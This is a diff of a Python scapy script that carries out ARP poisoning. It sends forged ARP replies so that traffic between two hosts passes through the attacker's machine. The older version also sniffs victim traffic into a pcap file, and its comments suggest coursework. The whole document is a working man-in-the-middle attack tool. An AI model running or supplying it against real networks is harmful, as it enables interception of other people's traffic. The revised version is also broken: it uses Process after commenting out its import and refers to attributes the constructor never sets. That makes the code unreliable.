@@ -1,122 +1,133 @@
-from multiprocessing import Process
+# Packages
+# from multiprocessing import Process
 from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, getmacbyip
-
-import os
 import sys
 import time
 
+# Constants
+DIVIDER = '-' * 50
 
+# ARP Poisoning Attack
 class ARPPoisoningAttack():
-    # the def init is how initialization of a class is done, very simmliar to java for those who didnt know
-    def __init__(self, victim, gateway, interface="enp0s3"):
-        self.victim = victim
-        self.victimMac = getmacbyip(victim)
-        self.gateway = gateway
-        self.gatewayMac = getmacbyip(gateway)
+    # Constructs the ARP Poisoning Attack
+    def __init__(self, victimOneIP, victimTwoIP, interface):
+        # Assign targets
+        self.victimOneIP = victimOneIP
+        self.victimTwoIP = victimTwoIP
         self.interface = interface
-        iface = interface
-        conf.verb = 0
 
-        print('Initialized {}:'.format(interface))
-        print('Gateway({}) is at {}.'.format(gateway, self.gatewayMac))
-       # print(ans)
-        print('Victim ({}) is at {}.'.format(victim, self.victimMac))
-        print('-'*30)
+        # Assign default scapy interface
+        conf.iface = interface
 
-    def run(self):
-           #the reason we made this special self.run is because we want to run sniffing and poisioning to run  at the same time so it uses the 
+        # Assign macAddresses
+        self.victimOneMac = getmacbyip(victimOneIP)
+        self.victimTwoMac = getmacbyip(victimTwoIP)
+        self.deviceMac = get_if_hwaddr(interface)
 
-        #muultiprocessing imort we made to make 2 threads
-        self.poison_thread = Process(target=self.poison)
+    # Returns interactive prompt string
+    def __repr__(self):
+        return 'ARPPoisoningAttack({}, {}, {})'.format(self.victimOneIP, self.victimTwoIP, self.interface)
+
+    # Returns string representation
+    def __str__(self):
+        return 'ARP Poisoning Attack on {}:\n - Victim One IP {} at {}\n - Victim Two IP {} at {}'.format(
+                self.interface, self.victimOneIP, self.victimOneMac, self.victimTwoIP, self.victimTwoMac)
+
+    # Print Initialization Message
+    def printInitializationMessage(self):
+        print('{divider}\nRunning {str}\n{divider}'.format(divider = DIVIDER, str = self))
+
+    # Execute the attack
+    def execute(self):
+        # Print initialization message
+        self.printInitializationMessage()
+
+        # Start ARP Poisoning Attack
+        #self.poisonDevices()
+
+        self.poison_thread = Process(target = self.poisonDevices)
         self.poison_thread.start()
+        self.poison_thread.join()
 
-        self.sniff_thread = Process(target=self.sniff)
-        self.sniff_thread.start()
+        #try:
+            # Start Poisoning Attack Thread
+            #self.poison_thread = Process(target = self.poisonDevices)
+           # self.poison_thread.start()
+        #except KeyboardInterrupt: # CTRL-C was pressed
+            #self.poison_thread.stop()
+        
+        
+        # Start Sniffing Attack Thread
+#        self.sniff_thread = Process(target = self.sniffPackets)
+#        self.sniff_thread.start()
 
-    def poison(self):
-        #note the op,psrc,pdst,hwdst are arttributes predefined in scapy
-        #full forms op:operation code, psrc: protocol source, pdst: protocol destination, hwdst: hardware destination
-        #these are from arp btw just look at wiki page not scapy docs on meaning of these for better details
-        poison_victim = ARP()
-        #just a cool note op is the opcode, remembr from the slides, it is set to 2 becase 2 is for replies remember?
-        poison_victim[ARP].hwsrc = "08:00:27:D0:25:4B"
-        #poison_victim.op = 2
-        poison_victim.psrc = self.gateway
-        poison_victim.pdst = self.victim
-        poison_victim.hwdst = self.victimMac
+    # Sends poisoned ARP packets to the victim and spoofed device
+    def poisonDevices(self):
+        # ARP Poisoning packet for the victim
+        victimPoisonPacket = ARP(hwsrc = self.deviceMac,
+                           psrc = self.spoofedIP,
+                           pdst = self.victimIP, 
+                           hwdst = self.victimMac)
 
-        #printing to be clean and help debugging and see that it works
-        print('ip src: {}.'.format(poison_victim.psrc))
-        print('ip dst: {}.'.format(poison_victim.pdst))
-        print('mac dst: {}.'.format(poison_victim.hwdst))
-        print('mac src: {}.'.format(poison_victim.hwsrc))
-        print(poison_victim.summary())
-        print('-'*30)
+        # ARP Poisoning packet for the spoofed device
+        spoofedPoisonPacket = ARP(hwsrc = self.deviceMac,
+                            psrc = self.victimIP,
+                            pdst = self.spoofedIP,
+                            hwdst = self.spoofedMac)
 
-        poison_gateway = ARP()
-        poison_gateway[ARP].hwsrc = "08:00:27:D0:25:4B"
-        #poison_gateway.op = 2
-        poison_gateway.psrc = self.victim
-        poison_gateway.pdst = self.gateway
-        poison_gateway.hwdst = self.gatewayMac
-
-        print('ip src: {}.'.format(poison_gateway.psrc))
-        print('ip dst: {}.'.format(poison_gateway.pdst))
-        print('mac dst: {}.' .format(poison_gateway.hwdst))
-        print('mac src: {}.' .format(poison_gateway.hwsrc))
-        print(poison_gateway.summary())
-        print('-'*30)
-        print('Beginning the ARP Poisoning. [CTRL-C to stop]')
+        # Infinitely poisons the victim and the spoofed device
         while True:
-            sys.stdout.write('.')
-            sys.stdout.flush()
-            try:
-                #sending signal can read more on scapy
-                send(poison_victim)
-                send(poison_gateway)
-            #to stop when CTRL-C pressed
-            except KeyboardInterrupt:
-                self.restore()
-                sys.exit()
-            #note this may be shocking but else is viable here how it works is that if there is no exception 
-            #it will do else block
-            else:
+            try: # Send poison packets
+                send(victimPoisonPacket)
+                send(spoofedPoisonPacket)
+
                 time.sleep(2)
+            except KeyboardInterrupt: # CTRL-C was pressed
+                # Cleaning ARP tables
+                self.clean()
+                break
+                #break
 
-    def sniff(self, count=1000):
-        time.sleep(5)
-        print('Sniffing {} packets'.format(count))
-        bpf_filter = "ip host %s" % victim
-        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
-        wrpcap('arper.pcap', packets)
-        print('Got the packets')
-        self.restore()
-        self.poison_thread.terminate()
-        print('Finished')
+    # Sniffs packets between the victim and spoofed device 
+#    def sniffPackets(self):
+#        time.sleep(5)
 
-    def restore(self):
-        print('Restoring ARP tables...')
+        # Sniff an infinite amount of packets from both devices
+#        packets = sniff(filter = "ip host {} || ip host {}".format(victimIP, spoofedIP))
+        
+        # Save sniffed packets
+#        wrpcap('sniffedPackets.pcap', packets)
+#        print('The sniffed packets have been saved')
+
+#        self.poison_thread.terminate()
+
+    # Clean ARP tables of the victim and spoofed device of references to the used device
+    def clean(self):
         send(ARP(
             op=2,
-            psrc=self.gateway,
-            hwsrc=self.gatewayMac,
-            pdst=self.victim,
+            psrc=self.spoofedIP,
+            hwsrc=self.spoofedMac,
+            pdst=self.victimIP,
             hwdst='ff:ff:ff:ff:ff:ff'), count=5)
         send(ARP(
             op=2,
-            psrc=self.victim,
+            psrc=self.victimIP,
             hwsrc=self.victimMac,
-            pdst=self.gateway,
+            pdst=self.spoofedIP,
             hwdst='ff:ff:ff:ff:ff:ff'), count=5)
 
 # Starts the program
 if __name__ == '__main__':
+    # Disables verbosity (command line) mode
+    conf.verb = 0
+
     # Assign parameters to variables
-    victim = sys.argv[1]
-    gateway = sys.argv[2]
+    victimOneIP = sys.argv[1]
+    victimTwoIP = sys.argv[2]
     interface = sys.argv[3]
+
     # Initialize Attack
-    attack = ARPPoisoningAttack(victim, gateway, interface)
+    attack = ARPPoisoningAttack(victimOneIP, victimTwoIP, interface)
 
     # Execute attack
-    attack.run()
+    attack.execute()
